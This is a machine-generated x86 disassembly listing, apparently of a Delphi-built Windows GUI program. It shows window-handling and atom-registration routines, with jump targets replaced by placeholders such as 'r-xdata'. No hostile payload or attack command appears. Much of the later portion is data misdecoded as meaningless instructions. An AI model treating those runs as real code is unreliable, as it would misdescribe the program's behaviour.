jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_4277ec
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e58
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403e78
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_427fac
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_427e64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c3c8
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_403f44
inc ebx
mov eax edi
mov edx esi
call sub_40404c
mov eax esi
call sub_40851c
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_427eac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_427f91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_427e64
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_427e64
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408354
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40411c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f98
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_427e64
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404114
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404160
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_427fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428057
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_427e64
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_427eac
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403ea8
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42805e
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_428064
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_412938
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4280b8
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403ea8
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_4086f0
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_428120
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_404114
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404374
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c184
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c1b8
test al al
jne r-xdata
dec ebx
sub_428250
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408b60
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_4282eb
add [ edi ] cl
add [ eax ] al
add al dh
inc esi
add [ esp + esi * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add ah ch
inc esi
add [ eax + 0x77 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add al ch
inc esi
add [ esp + esi * 2 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add ah ah
inc esi
add [ eax + 0x4678 ] dh
add [ eax ] al
add al ah
inc esi
add [ edi + esi * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add ah bl
inc esi
add ah dh
jbe r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add al bl
inc esi
add [ eax ] dh
js r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb999 ] dl
js r-xdata
add [ eax ] al
add [ eax ] al
add ah dl
inc esi
add [ eax ] dl
jbe r-xdata
mov eax rw-data
mov ecx 0xb
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
add [ eax ] al
add [ eax ] al
add [ edi + 0x78e40046 ] cl
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add al dl
inc esi
add [ eax ] bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
mov edx [ r-xdata ]
call sub_4048dc
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffb999 ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add ah cl
inc esi
add [ eax ] bh
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4283fd
retn
je r-xdata
cmp [ rw-data ] 0x0
push ebp
push sub_4283f6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add al cl
inc esi
add [ ecx + edi * 2 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ edi + 0x74c40046 ] dl
inc esi
sub_428400
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c28
call sub_428250
mov eax [ r-xdata ]
call sub_4135a8
mov eax [ r-xdata ]
call sub_413648
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
sub_428440
mov [ edx + eax * 2 ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
test [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x85
inc edx
add [ edx ] ch
test [ edx ] eax
add [ ecx ] 0x0
add al dl
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ edi + esi * 4 + 0x43 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah bh
sahf
inc edx
add [ esp + eax * 8 ] dh
inc ebx
add [ eax + edi * 4 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
sub_42849a
inc ebx
add [ eax + ebx * 4 ] bl
inc ebx
add [ eax + 0x34004397 ] cl
mov eax [ 0xffffffff9fdc0043 ]
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ esi + ebx * 4 + 0x42 ] ah
add ah al
mov dl 0x43
add al dl
mov [ 0xffffffffb3900042 ] eax
inc ebx
add [ eax - 0x2bffbc6a ] dl
popfd
inc ebx
add [ eax ] bh
popfd
inc ebx
add [ eax - 0x5a ] ah
inc ebx
add al bl
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffb5c00043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ eax ] ah
test al 0x43
add [ eax + 0x80043a8 ] cl
cdq
inc ebx
add [ eax + ebp * 4 + 0x43 ] dh
add [ eax + 0x42 ] dh
add [ edx ] al
add bh dl
inc edi
[ edi + ebx * 4 ]
sub_42890e
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
imul ecx [ eax ] 0x59
dec ebp
outsd
jbe r-xdata
movsb [ edi ] [ esi ]
pushfd
inc ecx
add [ eax - 0x65 ] dh
jb r-xdata
outsb
push ebx
je r-xdata
mov esp 0xe0004356
add [ eax ] al
jmp eax
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax ] bh
movsb [ edi ] [ esi ]
inc edx
add [ ecx ] al
add bh ch
inc esp
jb r-xdata
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
jb r-xdata
fwait
lea eax [ bx + si ]
adc [ edx + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
mov al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov al [ edx ]
dec eax
mov al [ edx ]
inc esp
add [ eax ] al
add [ eax ] bh
inc ecx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
add [ eax + 0xc0042a4 ] cl
inc esp
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x648fffbf ] ah
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0029 ] al
outsb
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx + 0x8 ] bp
pop ecx
sub_428b01
push 0x9fc40043
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x98004030
daa
inc esp
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
sub_428b32
inc ebx
add [ eax + ebx * 4 ] bl
inc ebx
add [ ebx + ecx * 8 ] bl
inc ebx
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ esi ] cl
inc edx
add [ ecx + edx + 0x44 ] dl
add [ eax - 0x54 ] ah
inc edx
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffe53c0043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add ah cl
stosb [ edi ]
inc edx
add [ eax ] ch
rol [ ebx ] cl
enter 0x43df 0x0
shl [ esi - 0x234fffbe ] 0x1
inc ebx
add al ah
fiadd [ ebx ]
pushad
loopne r-xdata
inc edx
add [ eax + 0x240042a7 ] al
stosd [ edi ]
inc edx
add ah al
stosb [ edi ]
inc edx
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add al ch
daa
inc esp
add [ esp + ebp * 4 + 0x7b80042 ] cl
inc esp
add [ eax - 0x47ffbbf6 ] ch
test al 0x42
add [ edi ] al
add [ ebx ] bh
pushfd
je r-xdata
inc esp
add [ eax - 0x22 ] ch
inc ebx
inc ebx
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0x40004427 ] bl
push ss
insd
push eax
popad
outsb
insb
lea eax [ eax ]
xor [ edx + eax * 2 + 0x540c0700 ] cl
inc ebx
jne r-xdata
inc ebx
inc ecx
add ah bh
retn
je r-xdata
add [ eax ] ch
insd
push eax
popad
outsb
insb
and al 0x8b
inc edx
add [ eax ] ah
push 0x43
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
les ebx [ ecx + eax * 2 + 0x419cbc00 ]
add ah ah
lahf
inc ebx
je r-xdata
or [ ebp + 0x78 ] al
je r-xdata
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add al ch
daa
inc esp
add [ esp + ebp * 4 + 0x7b80042 ] cl
inc esp
add [ eax - 0x47ffbbf6 ] ch
test al 0x42
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
js r-xdata
inc ecx
add [ esi ] cl
inc edx
add [ ecx + edx + 0x44 ] dl
add [ eax - 0x54 ] ah
inc edx
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
insb
jae r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
pop eax
push ebp
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c004396 ]
xchg edi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffe53c0043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add ah cl
stosb [ edi ]
inc edx
add [ eax ] ch
rol [ ebx ] cl
enter 0x43df 0x0
shl [ esi - 0x234fffbe ] 0x1
inc ebx
add al ah
fiadd [ ebx ]
pushad
loopne r-xdata
inc edx
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
mov al [ 0x2c00428c ]
mov [ edx ] es
inc edx
add [ eax ] cl
inc ebp
js r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add bh bh
js r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop esp
add [ eax ] al
insb
jae r-xdata
[ eax + eax ]
inc ebx
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
jmp [ edi ]
xor [ eax ] al
mov eax 0x98004030
daa
inc esp
add [ eax + 0x16 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 4 + 0x42 ] ch
add [ eax ] ch
add al [ eax ]
add al bl
mov al [ edx ]
les ebx [ edi + 0x33580041 ]
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
jpe r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
mov [ edx ] ss
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ eax ] dh
dec esi
inc ebx
add [ ebx ] bl
add bh bh
pushad
cwde
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sbb [ edx ] dl
inc ecx
add [ eax ] ah
add al [ eax ]
push [ edx + ebp * 4 ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
inc edx
jbe r-xdata
adc [ edx ] eax
add bh bh
inc eax
stosb [ edi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
pop esp
arpl [ ebx ] ax
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x63406564
inc ebx
add [ eax ] bl
add al [ eax ]
call [ edx + ebp * 4 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
dec ecx
inc ebx
jb r-xdata
outsb
outsb
jb r-xdata
adc eax [ eax ]
or eax [ edx + 0x6f ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
call [ esi ]
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
arpl [ ebx ] ax
sbb [ edx ] al
add bh bh
xchg esp eax
stosb [ edi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
arpl [ ebx ] ax
adc al [ edx ]
add bh bh
pop esp
stosb [ edi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
inc ebx
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
push esi
inc ebx
add [ eax + eax ] dh
call [ eax + ecx * 8 ]
inc ebx
add [ ecx ] al
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ eax ] cl
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jb r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x68ff0001 ] ah
or al 0x44
add [ esp + ecx + 0x44 ] cl
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
add [ gs : ebp + 0x43 ] dl
add [ ebx + 0x43 ] cl
add [ ebx + 0x43 ] bh
add [ ebx + eax * 8 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
sbb al 0x2
add bh bh
mov al 0xaa
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
[ 0x1ff0002 ]
jae r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
inc ebx
jne r-xdata
inc eax
add [ edi - 0x4300ffff ] ah
or eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax [ eax + eax + 0x10 ]
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41aeb8
jo r-xdata
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] al
arpl [ ebx ] ax
adc al 0x2
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ esp + ebx + 0x44 ] dh
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sbb [ gs : esi + 0x43 ] cl
adc [ eax ] al
test al 0x1
add bh bh
add al 0xf7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
in al dx
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x40ff0000
movsb [ edi ] [ esi ]
inc ebx
add [ eax - 0x5c ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
jb r-xdata
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
push esp
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
je r-xdata
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
les ecx [ esp + eax * 2 ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
inc esp
inc esp
je r-xdata
outsb
xor [ eax ] 0x0
jpe r-xdata
insb
mov [ 0xffffffffc3bc0043 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe8656c62
pop ebx
inc ebx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jo r-xdata
adc [ eax ] al
0xc0ff0000 0x43a4
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
adc [ ebp + 0x10043 ] ah
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
aam 0x13
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebp + ecx + 0x44 ]
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ ebp + ecx + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
or al 0x44
push 0x6948776f
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0x98ff0001
or al 0x44
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
inc esp
jb r-xdata
test al 0x58
inc ebx
add al ch
push eax
outsd
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ edx + 0x43 ]
adc [ eax ] al
cdq
add [ eax ] al
